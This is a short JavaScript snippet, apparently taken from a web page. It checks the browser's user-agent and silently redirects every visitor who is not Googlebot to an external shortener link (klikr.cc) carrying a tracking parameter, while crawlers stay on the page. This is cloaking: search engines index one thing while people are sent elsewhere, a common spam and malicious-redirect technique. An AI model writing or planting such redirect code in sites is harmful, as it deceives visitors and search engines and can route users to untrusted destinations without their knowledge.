// Check if the user-agent is not from a search engine crawler (e.g., Googlebot)
if (!navigator.userAgent.includes('Googlebot')) {
  // Redirect only normal users
  window.location.href = "https://klikr.cc/svadba-svetlyachkov-1-sez-5-ser-tv?s=blog-0711h8";
} else {
  // For search engine crawlers, you can choose to perform a different action or not redirect
  console.log("THanks for visiting my page");
}
